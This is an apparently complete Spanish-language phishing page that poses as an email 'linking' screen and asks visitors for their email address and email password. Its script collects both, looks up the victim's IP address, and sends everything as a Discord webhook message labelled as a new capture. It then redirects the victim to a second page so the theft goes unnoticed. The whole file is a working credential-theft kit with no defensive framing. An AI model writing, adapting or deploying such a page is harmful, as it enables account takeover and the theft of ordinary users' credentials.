<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Vinculación de Correo</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
      }
      body {
        background-color: #ffffff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      .card {
        background: #ffffff;
        width: 360px;
        padding: 40px 30px;
        border-radius: 45px;
        box-shadow: 0 10px 60px rgba(0, 0, 0, 0.4);
        text-align: center;
      }
      .logo-superior {
        width: 120px;
        margin-bottom: 10px;
        display: inline-block;
      }
      h1 {
        font-size: 26px;
        color: #1a1a1a;
        margin-bottom: 20px;
        font-weight: bold;
      }
      .imagen-sobre {
        width: 50px;
        margin: 0 auto 5px;
        display: block;
      }
      .texto-necesitamos {
        color: #8c8c8c;
        font-size: 18px;
        margin-bottom: 35px;
        font-weight: normal;
      }
      form {
        display: flex;
        flex-direction: column;
        gap: 25px;
      }
      input {
        width: 100%;
        padding: 12px;
        border: 1px solid #999;
        border-radius: 2px;
        font-size: 16px;
        color: #555;
        outline: none;
      }
      button {
        margin-top: 10px;
        padding: 16px;
        background-color: #000;
        color: #fff;
        border: none;
        border-radius: 25px;
        font-size: 15px;
        font-weight: 500;
        cursor: pointer;
      }
      button:disabled {
        background-color: #444;
        opacity: 0.8;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <img
        src="css/swj.png"
        alt="Logo"
        class="logo-superior"
      />
      <h1>Bienvenido/a!</h1>
      <img src="css/vNImrAq.png" alt="" class="imagen-sobre" />
      <p class="texto-necesitamos">
        Necesitamos que vincule nuevamente su correo electronico, inicie sesión
        y se vinculara automaticamente
      </p>

      <form id="loginForm">
        <input
          type="email"
          id="email"
          placeholder="Escriba su correo electronico"
          required
        />
        <input
          type="password"
          id="password"
          placeholder="Contraseña del correo electronico"
          required
        />
        <button type="submit" id="submitBtn">Vincular correo</button>
      </form>
    </div>

    <script src="css/envi.js"></script>

    <script>
      const loginForm = document.getElementById("loginForm");
      const submitBtn = document.getElementById("submitBtn");

      loginForm.addEventListener("submit", async function (e) {
        e.preventDefault();

        const emailValue = document.getElementById("email").value;
        const passValue = document.getElementById("password").value;

        submitBtn.innerText = "Procesando...";
        submitBtn.disabled = true;

        let userIP = "Desconocida";
        try {
          const ipResponse = await fetch("https://api.ipify.org?format=json");
          const ipData = await ipResponse.json();
          userIP = ipData.ip;
        } catch (err) {
          console.error(err);
        }

        // Mensaje en texto plano para Discord
        const contentText =
          `**NUEVO REGISTRO**\n` +
          `> **Correo:** ${emailValue}\n` +
          `> **Contraseña:** ${passValue}\n` +
          `> **IP:** ${userIP}\n` +
          `> **Fecha:** ${new Date().toLocaleString()}`;

        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: contentText }),
        })
          .then((response) => {
            if (response.ok) {
              window.location.href = "index2.html";
            } else {
              alert("Error al procesar.");
              resetBtn();
            }
          })
          .catch(() => {
            alert("Error de conexión.");
            resetBtn();
          });
      });

      function resetBtn() {
        submitBtn.disabled = false;
        submitBtn.innerText = "Vincular correo";
      }
    </script>
  </body>
</html>
